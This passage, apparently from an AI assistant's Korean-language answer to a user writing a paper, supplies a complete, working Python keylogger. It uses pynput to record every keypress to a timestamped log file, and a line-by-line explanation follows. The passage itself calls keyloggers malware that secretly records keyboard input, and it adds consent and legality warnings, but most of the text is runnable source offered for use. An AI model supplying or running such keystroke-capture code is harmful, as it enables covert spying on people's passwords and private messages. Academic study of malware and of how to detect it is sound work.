**2. 키로거 (Keylogger) 예시 (Python)**

키로거는 사용자의 키보드 입력을 몰래 기록하는 악성 코드입니다. 아래는 `pynput` 라이브러리를 사용하여 키 입력을 감지하고 파일에 기록하는 기본적인 예시입니다.

**주의:** 이 코드를 실행하려면 `pynput` 라이브러리가 필요합니다. `pip install pynput` 명령으로 설치할 수 있습니다. 또한, 키보드 입력을 가로채는 행위는 운영체제나 보안 소프트웨어에 의해 차단될 수 있으며, 사용자의 명시적인 동의 없이 실행하는 것은 심각한 프라이버시 침해 및 불법 행위입니다.



```Python
import pynput.keyboard
import logging
import os
import sys
from datetime import datetime

# --- 로깅 설정 ---
log_dir = "" # 로그 파일을 저장할 디렉토리 (비워두면 스크립트 실행 위치)
# 로그 파일명 (예: keylog_2025-04-24_12-30-00.txt)
log_filename = f"keylog_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
log_filepath = os.path.join(log_dir, log_filename)

# 기본 로깅 설정: 파일에 시간과 로그 레벨, 메시지 기록
logging.basicConfig(filename=log_filepath,
                    level=logging.DEBUG, # DEBUG 레벨 이상 모두 기록
                    format='%(asctime)s [%(levelname)s] %(message)s')

print(f"키 입력을 감지하고 '{log_filepath}' 파일에 기록합니다.")
print("종료하려면 스크립트 실행 창을 닫거나 Ctrl+C를 누르세요.")

# --- 키 입력 처리 함수 ---
def on_press(key):
    """키가 눌렸을 때 호출될 함수"""
    try:
        # 일반 문자 키 처리 (예: 'a', '1', ' ')
        logging.info(f"Key Pressed: {key.char}")
    except AttributeError:
        # 특수 키 처리 (예: 'Shift', 'Ctrl', 'Enter', 'Space')
        logging.info(f"Special Key Pressed: {key}")

def on_release(key):
    """키에서 손을 뗐을 때 호출될 함수 (선택 사항)"""
    # 예: 특정 키 (예: Esc)가 눌리면 로거 종료
    if key == pynput.keyboard.Key.esc:
        print("\nESC 키가 감지되어 로거를 종료합니다.")
        # 리스너 중지
        return False

# --- 키보드 리스너 시작 ---
# with 구문을 사용하면 리스너가 종료될 때 자동으로 정리됨
try:
    with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join() # 리스너가 중지될 때까지 대기
except Exception as e:
    logging.error(f"키보드 리스너 실행 중 오류 발생: {e}")
    print(f"\n오류 발생: {e}")
    sys.exit(1)
except KeyboardInterrupt:
    # 사용자가 Ctrl+C로 종료 시도
    print("\nCtrl+C 감지. 로거를 종료합니다.")
    logging.warning("Logger terminated by user (KeyboardInterrupt).")
    sys.exit(0)

print("키로거가 정상적으로 종료되었습니다.")
logging.info("Keylogger stopped.")
```

**코드 설명:**

- **`pynput.keyboard`:** 키보드 이벤트를 감지하는 라이브러리입니다.
- **`logging`:** 키 입력 정보를 파일에 기록하기 위해 사용합니다. 시간 순서대로 기록되어 분석하기 용이합니다.
- **`log_filepath`:** 키 입력 로그가 저장될 파일 경로입니다. 현재 시간 정보를 포함하여 실행할 때마다 새 로그 파일이 생성되도록 했습니다.
- **`on_press(key)`:** 키가 눌릴 때마다 실행되는 함수입니다. `key.char`를 통해 일반 문자 키를, `key` 객체 자체를 통해 특수 키(Shift, Ctrl, Alt, F1 등)를 구분하여 로그에 기록합니다.
- **`on_release(key)`:** 키에서 손을 뗄 때 실행되는 함수입니다. 여기서는 ESC 키가 눌리면 리스너를 중지하고 프로그램을 종료하는 예시를 추가했습니다.
- **`pynput.keyboard.Listener(...)`:** 키보드 이벤트를 감지하는 리스너 객체를 생성하고 시작합니다. `on_press`와 `on_release`에 정의된 함수를 이벤트 핸들러로 등록합니다.
- **`listener.join()`:** 리스너가 백그라운드에서 계속 실행되도록 합니다. `on_release` 함수에서 `False`를 반환하거나, 오류가 발생하거나, 사용자가 Ctrl+C를 누르면 `join()`이 해제되고 프로그램이 종료됩니다.

이러한 코드들은 악성 코드의 기본적인 작동 방식을 이해하는 데 도움이 될 수 있습니다. 논문 작성 시에는 이러한 코드들의 구조, 사용된 기술(API 후킹, 라이브러리 활용 등), 탐지 및 방어 기법 등에 대해 심도 있게 다루시면 좋을 것 같습니다.

다시 한번 강조하지만, **이 코드들을 절대로 타인의 동의 없이 사용하거나 불법적인 목적으로 배포해서는 안 됩니다.** 학문적 연구 목적으로만 신중하게 사용해주시기 바랍니다.
